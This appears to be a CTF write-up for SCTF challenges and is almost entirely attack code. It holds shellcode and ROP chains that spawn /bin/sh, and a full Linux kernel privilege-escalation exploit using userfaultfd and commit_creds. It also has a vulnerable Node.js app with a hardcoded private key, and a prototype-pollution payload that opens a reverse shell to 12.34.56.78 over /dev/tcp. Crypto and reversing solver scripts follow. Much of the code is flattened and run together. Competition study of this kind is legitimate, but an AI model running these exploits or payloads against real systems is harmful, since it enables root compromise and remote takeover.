shellcode = b'x28x26flag'shellcode += b'x2ax28x31'shellcode += b'x2ax2ax2ax23x24x2ax2ax23x24'shellcode += b'x28x26x02x00x00x00'shellcode += b'x30'
shellcode += b'x31x29x2bx25x24x29x29x29x24'shellcode += b'x2ax29'shellcode += b'x30'
shellcode += b'x31x29x2bx2ax28x26x50x00x00x00x24x26x01x00x00x00x25x28x26x01x00x00x00x30'
io.sendlineafter(b'she',shellcode)
io.interactive()
package main
func function() string {
 return "/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh/bin/sh"}
func main() {
 var a string = function() // Capture the return value from function a = "x00x00x00x00x00x00x00x00xe7x7ax44x00x00x00x00x00x3bx00x00x00x00x00x00x00x16x10x40x00x00x00x00x00x00x00x00x00x00x00x00x00x94xb5x44x00x00x00x00x00x96x80x49x00x00x00x00x00"
 return 0}// a =''//rdx // a = a + "xe7x7ax44x00x00x00x00x00"/poprax// a = a + "x3bx00x00x00x00x00x00x00" //rax// a = a + "x16x10x40x00x00x00x00x00" //0x0000000000401016 add rsp 8 ret// a = a + "x00x00x00x00x00x00x00x00" //rsi// a = a + "x94xb5x44x00x00x00x00x00" //0x000000000044b594 poprdi syscall// a = a + "x56x80x49x00x00x00x00x00" //rdi
    #include "sekiro.h"
    #define COMMIT_CREDS 0xFFFFFFFF81097D00 #define INIT_CRED 0xFFFFFFFF82448CC0#define WORK_FOR_CPU_FN 0xffffffff810bd960#define POP_RDI_RET 0xffffffff81008989#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81C00aa5#define addrsp_0x1a0 0xffffffff816319d9#define addrsp_0x1b0 0xffffffff8114f5b2#define SWAPGS 0xffffffff8105c8f0int fd_vuln;char* uffd_buf_hijack;
size_t heapaddr;
struct request{ char *rd; size_t a1; size_t a2; size_t a3; size_t a4; size_t a5;
};
void get_shell() { system("/bin/sh");}size_t user_cs, user_rflags, user_sp, user_ss;
void save_status() { __asm__("mov user_cs, cs;" "mov user_ss, ss;" "mov user_sp, rsp;" "pushf;" "pop user_rflags;"); puts("[*] status has been saved.");}
void err_exit(char *msg){ printf(" 33[31m 33[1m[x] Error at:  33[0m%sn", msg); sleep(5); exit(EXIT_FAILURE);}
void info(char *msg){ printf(" 33[32m 33[1m[+] %sn 33[0m", msg);}
void hexx(char *msg, size_t value){ printf(" 33[32m 33[1m[+] %s: %#lxn 33[0m", msg, value);}
/* bind the process to specific core */void bind_core(int core){ cpu_set_t cpu_set;
 CPU_ZERO(&cpu_set); CPU_SET(core, &cpu_set); sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
 printf(" 33[34m 33[1m[*] Process binded to core  33[0m%dn", core);}
void get_flag(){ system("echo -ne '#!/bin/shn/bin/chmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x"); system("echo -ne '\xff\xff\xff\xff' > /tmp/sekiro"); system("chmod +x /tmp/sekiro"); system("/tmp/sekiro"); sleep(0.3); system("cat /flag"); exit(0);}size_t orignal[0x30];pthread_t pwn;
size_t uffd_buf[512];
size_t kernel_offset ;
int tty_fd;
void hijack_handler(void *args){ int uffd = (int)args; struct uffd_msg msg; struct uffdio_copy uffdio_copy;
 for (;;) { struct pollfd pollfd; pollfd.fd = uffd; pollfd.events = POLLIN; if (poll(&pollfd, 1, -1) == -1) err_exit("Failed to exec poll for leak_handler");
 int res = read(uffd, &msg, sizeof(msg)); if (res == 0) err_exit("EOF on userfaultfd for leak_handler"); if (res == -1) err_exit("ERROR on userfaultfd for leak_handler"); if (msg.event != UFFD_EVENT_PAGEFAULT) err_exit("INCORRET EVENT in leak_handler"); // operation info("hijack the kernel in userfaultfd -- hijack_handler"); del();
 tty_fd=open("/dev/ptmx", O_RDWR); // size_t fake_ops[16] = { 0 }; // fake_ops[12] = WORK_FOR_CPU_FN+kernel_offset; uffd_buf[0]=0x100005401; uffd_buf[1]=addrsp_0x1a0 +kernel_offset; uffd_buf[2]=heapaddr+(0xffff88800e11a6c0-0xffff88800e3d2800); uffd_buf[3] = heapaddr+0x8-0x60; uffd_buf[4] = COMMIT_CREDS+kernel_offset; uffd_buf[5] = INIT_CRED+kernel_offset;
 // printf("fake_ops->ioctl: %#lxn", fake_ops[12]); // printf("fake_ops: %#lxn", fake_ops); uffdio_copy.src = uffd_buf; uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(0x1000 - 1); uffdio_copy.len = 0x1000; uffdio_copy.mode = 0; uffdio_copy.copy = 0; if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) err_exit("Failed to exec ioctl for UFFDIO_COPY in leak_handler"); }}
void register_userfaultfd(void *uffd_buf, pthread_t pthread_moniter, void *handler){ int uffd; struct uffdio_api uffdio_api; struct uffdio_register uffdio_register;
 uffd = syscall(__NR_userfaultfd, O_NONBLOCK | O_CLOEXEC); if (uffd == -1) err_exit("syscall for userfaultfd ERROR in register_userfaultfd func");
 uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) err_exit("ioctl for UFFDIO_API ERROR");
 uffdio_register.range.start = (unsigned long long)uffd_buf; uffdio_register.range.len = 0x1000; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) err_exit("ioctl for UFFDIO_REGISTER ERROR");
 int res = pthread_create(&pthread_moniter, NULL, handler, uffd); if (res == -1) err_exit("pthread_create ERROR in register_userfaultfd func");}size_t koffset;
size_t add(){
 char *addr = malloc(8); // 分配 8 字节
 struct request req={.a5=&addr}; while (1) { int res=ioctl(fd_vuln,0xFFF0,&req); //printf("%d n",res); if(res!=-1){ printf("success!n"); hexx("heap addr", addr); //getchar(); break; } } return addr;
 }void del(){
 struct request req={0}; while (1) { int res=ioctl(fd_vuln,0xFFF1,&req); //printf("%d n",res); if(res!=-1){ printf("success!n"); break; } } }size_t swapgs_restore_regs_and_return_to_usermode;
size_t init_cred;
size_t pop_rdi_ret;
size_t commit_creds;
size_t iretq;
size_t poprsp;
size_t ret;
size_t swapgs;
int main(){ save_status(); int packet_fd; size_t leak, kernel_base; char data[0x200]; char buf[0x20]; size_t rebuf[0x10]; bind_core(0); fd_vuln = open("/dev/ksctf", 2); int note_fd = open("/sys/kernel/notes", O_RDONLY); read(note_fd, data, 0x100); //hexdump(data, 0x100);0xffffffff81002000
 memcpy(&leak, &data[0x84], 8); hexx("leak", leak); kernel_base = leak - 0x19e1180; hexx("kernel_base", kernel_base); kernel_offset = kernel_base - 0xffffffff81000000; hexx("kernel_offset", kernel_offset); heapaddr=add(); uffd_buf_hijack = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); register_userfaultfd(uffd_buf_hijack, &pwn, hijack_handler); pop_rdi_ret =POP_RDI_RET+kernel_offset; ret=pop_rdi_ret+1; init_cred =INIT_CRED+kernel_offset; commit_creds=COMMIT_CREDS+kernel_offset; swapgs_restore_regs_and_return_to_usermode=SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+kernel_offset; iretq=0xffffffff81009069+kernel_offset; swapgs=SWAPGS+kernel_offset; size_t gs=(size_t) get_shell; write(fd_vuln,uffd_buf_hijack,0x40); add(); poprsp=0xffffffff81000401+kernel_offset; size_t *rop [0x30], it=0;
 rop[it++] = pop_rdi_ret; rop[it++] = init_cred; rop[it++] = commit_creds; rop[it++] = swapgs ; rop[it++] = iretq; rop[it++] = (size_t) get_shell; rop[it++] = user_cs; rop[it++] = user_rflags; rop[it++] = user_sp; rop[it++] = user_ss; write(fd_vuln,rop,0x50); heapaddr+=0x800; __asm__( "mov r15, poprsp;" "mov r14, poprsp;" "mov r13, heapaddr;" "mov rax, 0x10;" "mov rdx, 8;" "mov rsi, rsp;"
 ); return 0;}
Cannot read properties of undefined (reading 'replace'),ExP0rtApi?v=./&f=app.js
const express = require('express');
const fs = require('fs');
const nodeRsa = require('node-rsa');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(16).toString('hex');
const path = require('path');
const zlib = require('zlib');
const mysql = require('mysql');
const handle = require('./handle');
const cp = require('child_process');
const cookieParser = require('cookie-parser');
// MySQL connectionconst con = mysql.createConnection({ host: 'localhost', user: 'ctf', password: 'ctf123123', port: '3306', database: 'sctf'});
con.connect((err) => { if (err) { console.error('Error connecting to MySQL:', err.message); setTimeout(con.connect(), 2000); // Retry connection after 2 seconds } else { console.log('Connected to MySQL'); }});
// RSA key generationconst key = new nodeRsa({ b: 1024 });key.setOptions({ encryptionScheme: 'pkcs1' });
const publicPem = `-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2ICXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGeI+Atul1rSE0APhHoPwIDAQAB-----END PUBLIC KEY-----`;
const privatePem = `-----BEGIN PRIVATE KEY-----MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87li+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgIlYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFYJal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kGmhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2yeKmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqhUvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8lzIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOgxu/vfQ0A1jHRNC7t-----END PRIVATE KEY-----`;
// Express app setupconst app = express();app.use(bodyParser.json());app.use(express.urlencoded({ extended: true }));app.use(express.static(path.join(__dirname, 'static')));app.use(cookieParser());
let Reportcache = {};
// Middleware to verify adminfunction verifyAdmin(req, res, next) { const token = req.cookies['auth_token'];
 if (!token) { return res.status(403).json({ message: 'No token provided' }); }
 jwt.verify(token, SECRET_KEY, (err, decoded) => { if (err) { return res.status(403).json({ message: 'Failed to authenticate token' }); }
 if (decoded.role !== 'admin') { return res.status(403).json({ message: 'Access denied. Admins only.' }); }
 req.user = decoded; next(); });}
// Routesapp.get('/hello', (req, res) => { res.send('<h1>Welcome Admin!!!</h1>
');});
app.get('/config', (req, res) => { res.json({ publicKey: publicPem });});
const decrypt = function(body) { try { const pem = privatePem; const key = new nodeRsa(pem, { encryptionScheme: 'pkcs1', b: 1024 }); key.setOptions({ environment: "browser" }); return key.decrypt(body, 'utf8'); } catch (e) { console.error("decrypt error", e); return false; }};
app.post('/login', (req, res) => { const encryptedPassword = req.body.password; const username = req.body.username;
 try { const passwd = decrypt(encryptedPassword); if (username === 'admin') { const sql = `SELECT (SELECT password FROM user WHERE username = 'admin') = '${passwd}';`; con.query(sql, (err, rows) => { if (err) throw new Error(err.message); if (rows[0][Object.keys(rows[0])]) { const token = jwt.sign({ username, role: username }, SECRET_KEY, { expiresIn: '1h' }); res.cookie('auth_token', token, { secure: false }); res.status(200).json({ success: true, message: 'Login Successfully' }); } else { res.status(200).json({ success: false, message: 'Error Password!' }); } }); } else { res.status(403).json({ success: false, message: 'This Website Only Open for admin' }); } } catch (error) { res.status(500).json({ success: false, message: 'Error decrypting password!' }); }});
app.get('/ExP0rtApi', (req, res) => { let rootpath = req.query.v; let file = req.query.f;
 file = file.replace(/\.\.\//g, ''); rootpath = rootpath.replace(/\.\.\//g, '');
 if (rootpath === '') { if (file === '') { return res.status(500).send('Try to find parameters HaHa'); } else { rootpath = "static"; } }
 const filePath = path.join(__dirname, rootpath + "/" + file);
 if (!fs.existsSync(filePath)) { return res.status(404).send('File not found'); }
 fs.readFile(filePath, (err, fileData) => { if (err) { console.error('Error reading file:', err); return res.status(500).send('Error reading file'); }
 zlib.gzip(fileData, (err, compressedData) => { if (err) { console.error('Error compressing file:', err); return res.status(500).send('Error compressing file'); } const base64Data = compressedData.toString('base64'); res.send(base64Data); }); });});
app.get("/report", (req, res) => { res.sendFile(path.join(__dirname, "static", "report_noway_dirsearch.html"));});
app.post("/report", verifyAdmin, (req, res) => { const { user, date, reportmessage } = req.body; if (Reportcache[user] === undefined) { Reportcache[user] = {}; } Reportcache[user][date] = reportmessage; res.status(200).send("<script>alert('Report Success');window.location.href='/report'</script>");});
app.get('/countreport', (req, res) => { let count = 0; for (const user in Reportcache) { count += Object.keys(Reportcache[user]).length; } res.json({ count });});
// Check current running userapp.get("/VanZY_s_T3st", (req, res) => { const command = 'whoami'; const cmd = cp.spawn(command, []); cmd.stdout.on('data', (data) => { res.status(200).end(data.toString()); });});
// Start serverapp.listen(3000, () => { console.log('Server running on http://localhost:
3000');});再读取一下require里的handle/index.js和child_process.jsindex.js,封装了一下child_processvar ritm = require('require-in-the-middle');var patchChildProcess = require('./child_process');new ritm.Hook( ['child_process'], function (module, name) { switch (name) { case 'child_process': { return patchChildProcess(module); } } });child_process.jsfunction patchChildProcess(cp) { cp.execFile = new Proxy(cp.execFile, { apply: patchOptions(true) }); cp.fork = new Proxy(cp.fork, { apply: patchOptions(true) }); cp.spawn = new Proxy(cp.spawn, { apply: patchOptions(true) }); cp.execFileSync = new Proxy(cp.execFileSync, { apply: patchOptions(true) }); cp.execSync = new Proxy(cp.execSync, { apply: patchOptions() }); cp.spawnSync = new Proxy(cp.spawnSync, { apply: patchOptions(true) }); return cp;}
function patchOptions(hasArgs) { return function apply(target, thisArg, args) { var pos = 1; if (pos === args.length) { args[pos] = prototypelessSpawnOpts(); } else if (pos < args.length) { if (hasArgs && (Array.isArray(args[pos]) || args[pos] == null)) { pos++; } if (typeof args[pos] === 'object' && args[pos] !== null) { args[pos] = prototypelessSpawnOpts(args[pos]); } else if (args[pos] == null) { args[pos] = prototypelessSpawnOpts(); } else if (typeof args[pos] === 'function') { args.splice(pos, 0, prototypelessSpawnOpts()); } } return target.apply(thisArg, args); };}function prototypelessSpawnOpts(obj) { var prototypelessObj = Object.assign(Object.create(null), obj); prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env); return prototypelessObj;}module.exports = patchChildProcess;
function prototypelessSpawnOpts(obj) { var prototypelessObj = Object.assign(Object.create(null), obj); prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env); return prototypelessObj;}
{ "user": "__proto__", "date": 2, "reportmessage": { "shell": "/bin/bash", "env": { "BASH_FUNC_whoami%%": "() { bash -c 'bash -i >& /dev/tcp/12.34.56.78/2333 0>&1'; }" } }}
    #include<stdio.h> #include<stdlib.h> #include<stdint.h>uint32_t decrypt(uint32_t res) { for (int i = 0; i < 32;i++) { if (res % 2 == 0) { res /= 2; }else { res ^= 0x85B6874F; res /= 2; res |=(1 << 31); } } return res;}int main(){ unsigned int data[10] = { 0xA3C8C033, 0x1A1DBFF3, 0xC6B7413B, 0x52865EF1, 0x1E6BCF52, 0xBFCBF9C5, 0xF1627BED, 0x544843F7, 0xD94C85FB, 0x6EF23035}; int key[]={ };//动调获取 int flagg[]={0x56, 0x74, 0x5A, 0x67, 0x55, 0x6E, 0x73, 0x2F, 0x55, 0x67, 0x7E, 0x2C, 0x56, 0x6E, 0x6D, 0x68, 0x56, 0x67, 0x77, 0x65, 0x55, 0x5D, 0x48, 0x2D, 0x54, 0x74, 0x71, 0x34, 0x56, 0x5D, 0x56, 0x66, 0x55, 0x74, 0x4D, 0x2E, 0x54, 0x6E, 0x5C, 0x26}; char flag[40]; for (int i = 0; i < 10;i++) { uint32_t result = decrypt(data[i]); int temp[4]; for (int j=0;j<4;j++){ temp[j]=result&0xff; result>>=8; } for (int j=0;j<4;j++){ temp[j]^=key[i*4+j]; temp[j]^=30; printf("%c",temp[j]); } } return 0;}
from Crypto.Util.number import long_to_bytes
from sympy import symbols, Eq, solve
from hashlib import md5
N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951e = 334450817132213889699916301332076676907807495738301743367532551341259554597455532787632746522806063413194057583998858669641413549469205803510032623432057274574904024415310727712701532706683404590321555542304471243731711502894688623443411522742837178384157350652336133957839779184278283984964616921311020965540513988059163842300284809747927188585982778365798558959611785248767075169464495691092816641600277394649073668575637386621433598176627864284154484501969887686377152288296838258930293614942020655916701799531971307171423974651394156780269830631029915305188230547099840604668445612429756706738202411074392821840
#连分数展开
def continued_fraction(numerator, denominator): while denominator: quotient, remainder = divmod(numerator, denominator) yield quotient numerator, denominator = denominator, remainder
# 逐步分数近似
def convergents(continued_fraction_seq): num1, num2 = 1, 0 den1, den2 = 0, 1 for q in continued_fraction_seq: num1, num2 = q * num1 + num2, num1 den1, den2 = q * den1 + den2, den1 yield num1, den1
# 求解 d 和 k 的有效值
def find_valid_gifts(e, N): frac_gen = continued_fraction(e, N**2) for k, d in convergents(frac_gen): if k == 0 or (e * d - 1) % k != 0: continue yield (e * d - 1) // k
# 通过 gift 求解 p 和 q
def solve_pq(N, gift): p, q = symbols('p q') eq1 = Eq(N, p * q) eq2 = Eq((p**2 + p + 1) * (q**2 + q + 1), gift) return solve([eq1, eq2], (p, q))
# 主逻辑valid_gifts = list(find_valid_gifts(e, N))print(f"找到的有效 gift 值: {valid_gifts}")
# 仅演示第一个 gift 的 p, q 解法for tmp in valid_gifts: solutions = solve_pq(N, tmp) print(f"对于 gift={tmp}，求解的 p 和 q 为: {solutions}")
# 示例输出 flagp_candidate = 5984758006806378809956519900535567746479053908385004504598524889746027259134602871258417614666511624425382102292754198444334667792470478919346145707972191p_bytes = long_to_bytes(int(p_candidate))flag = 'SCTF{' + md5(p_bytes).hexdigest() + '}'print("生成的 flag:", flag)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]